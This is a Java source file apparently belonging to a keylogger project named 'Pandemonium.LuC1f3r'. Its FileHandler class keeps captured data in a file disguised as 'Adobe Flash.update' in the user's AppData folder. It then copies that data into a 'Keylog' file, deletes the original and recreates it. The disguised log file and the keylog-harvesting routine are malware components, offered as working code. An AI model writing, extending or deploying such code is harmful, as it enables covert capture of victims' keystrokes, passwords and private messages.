package com.Pandemonium.LuC1f3r;

import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;
import java.util.List;

public class FileHandler {
	public static File f = new File(System.getProperty("user.home")
			+ "\\AppData\\Roaming\\Adobe Flash.update");

	public static boolean checkFirst() {
		if (f.exists()) {
			System.out.println("File found starting copy procedure");
			Copy();
			return true;
		} else {
			System.out
					.println("File does not exist creating file and activating listener");
			createDirectory();
			Main.Kill();
			return false;
		}
	}

	private static void Copy() {
		System.out.println("Copying...");
		List<String> text = null;

		try {
			text = Files.readAllLines(f.toPath(), StandardCharsets.UTF_8);
		} catch (IOException e) {
			e.printStackTrace();
		}
		File newFile = new File("Keylog");
		BufferedWriter writer = null;
		try {
			newFile.createNewFile();
		} catch (IOException e) {
			e.printStackTrace();
		}
		try {
			writer = Files.newBufferedWriter(newFile.toPath(),
					StandardCharsets.UTF_8, StandardOpenOption.APPEND);
		} catch (IOException e) {
			e.printStackTrace();
		}

		for (int i = 0; i < text.size(); i++) {
			try {
				writer.write(text.get(i));
			} catch (IOException e) {
				e.printStackTrace();
			}

			try {
				writer.flush();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}

		f.delete();
		createDirectory();

	}

	private static void createDirectory() {
		try {
			f.createNewFile();
		} catch (IOException e) {
			System.out.println("Failed to create file");
			e.printStackTrace();
		}
		System.out.println("Created: " + f.toPath());
		Main.Kill();
	}

}
